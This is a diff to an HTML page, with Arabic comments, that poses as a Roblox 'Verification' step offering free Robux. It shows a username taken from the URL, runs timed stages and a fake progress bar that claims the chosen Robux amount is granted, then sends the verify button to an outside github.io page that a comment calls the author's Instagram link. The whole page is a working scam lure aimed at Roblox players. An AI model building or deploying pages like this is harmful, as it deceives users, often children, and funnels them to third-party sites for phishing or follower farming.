@@ -6,7 +6,9 @@
 <title>Verification</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
 
+<!-- particles.js -->
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+
 <style>
 :root{--accent:#7b2cff;--accent-dark:#5a1fd1;--card-w:420px;--radius:20px;--ink:#101418;--muted:#6b7280}
 #particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}
@@ -52,7 +54,9 @@ h1{margin:26px 0 6px;letter-spacing:.12em}
 <section class="card">
   <div class="brand-bar">
     <!-- شعار Roblox -->
-    <img class="brand" src="https://ngtimes.ca/wp-content/uploads/2021/01/roblox-logo.png" alt="ROBLOX">
+    <img class="brand"
+         src="https://ngtimes.ca/wp-content/uploads/2021/01/roblox-logo.png"
+         alt="ROBLOX" loading="lazy" referrerpolicy="no-referrer">
   </div>
 
   <!-- المرحلة 1 -->
@@ -73,10 +77,22 @@ h1{margin:26px 0 6px;letter-spacing:.12em}
     <h1>SELECT ROBUX</h1>
     <p class="muted">Choose your Robux amount</p>
     <div class="amounts">
-      <div class="amount-btn" data-val="1000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 1000 Robux</div>
-      <div class="amount-btn" data-val="2500"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 2500 Robux</div>
-      <div class="amount-btn" data-val="5000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 5000 Robux</div>
-      <div class="amount-btn" data-val="50000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 50000 Robux</div>
+      <div class="amount-btn" data-val="1000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 1000 Robux
+      </div>
+      <div class="amount-btn" data-val="2500">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 2500 Robux
+      </div>
+      <div class="amount-btn" data-val="5000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 5000 Robux
+      </div>
+      <div class="amount-btn" data-val="50000">
+        <img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"
+             alt="Robux" loading="lazy" referrerpolicy="no-referrer"> 50000 Robux
+      </div>
     </div>
   </div>
 
@@ -98,13 +114,19 @@ h1{margin:26px 0 6px;letter-spacing:.12em}
 </section>
 
 <script>
-particlesJS("particles-js",{particles:{number:{value:70,density:{enable:true,value_area:800}},color:{value:"#7b2cff"},
-shape:{type:"circle"},opacity:{value:.6,random:true},size:{value:4,random:true},
-line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
-move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
-interactivity:{detect_on:"canvas",events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
-modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},retina_detect:true});
+/* particles */
+particlesJS("particles-js",{
+  particles:{number:{value:70,density:{enable:true,value_area:800}},color:{value:"#7b2cff"},
+  shape:{type:"circle"},opacity:{value:.6,random:true},size:{value:4,random:true},
+  line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
+  move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
+  interactivity:{detect_on:"canvas",
+    events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
+    modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
+  retina_detect:true
+});
 
+/* بيانات المستخدم */
 const params=new URLSearchParams(location.search);
 const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
 const username=(store.u||params.get('u')||'Guest').trim();
@@ -115,7 +137,7 @@ document.getElementById("vUser").textContent=username;
 
 let chosen=0;
 
-// مراحل متسلسلة
+/* المراحل */
 setTimeout(()=>{showStage(2)},2000);
 setTimeout(()=>{showStage(3)},4000);
 
@@ -124,28 +146,32 @@ function showStage(n){
   document.getElementById("stage"+n).style.display="block";
 }
 
-// اختيار روبكس
+/* اختيار الروبكس */
 document.querySelectorAll(".amount-btn").forEach(btn=>{
   btn.onclick=()=>{
     chosen=btn.dataset.val;
     document.getElementById("gAmount").textContent=chosen;
     showStage(4);
     startProgress();
-  }
+  };
 });
 
 function startProgress(){
   const fill=document.getElementById("fill"); let p=0;
   const interval=setInterval(()=>{
     p+=5; fill.style.width=p+"%";
-    if(p>=100){clearInterval(interval);document.getElementById("vAmount").textContent=chosen;
-      document.getElementById("vAmount2").textContent=chosen; showStage(5);}
+    if(p>=100){
+      clearInterval(interval);
+      document.getElementById("vAmount").textContent=chosen;
+      document.getElementById("vAmount2").textContent=chosen;
+      showStage(5);
+    }
   },250);
 }
 
-// زر تحقق
-const INSTAGRAM_URL="https://gnesvas.github.io/chjan/"; // حط رابط انستقرامك هنا
-document.getElementById("verifyBtn").onclick=()=>{if(INSTAGRAM_URL)location.href=INSTAGRAM_URL;}
+/* زر التحقق */
+const INSTAGRAM_URL="https://gnesvas.github.io/chjan/"; // عدّلها لو تبي
+document.getElementById("verifyBtn").onclick=()=>{ if(INSTAGRAM_URL) location.href=INSTAGRAM_URL; };
 </script>
 </body>
 </html>
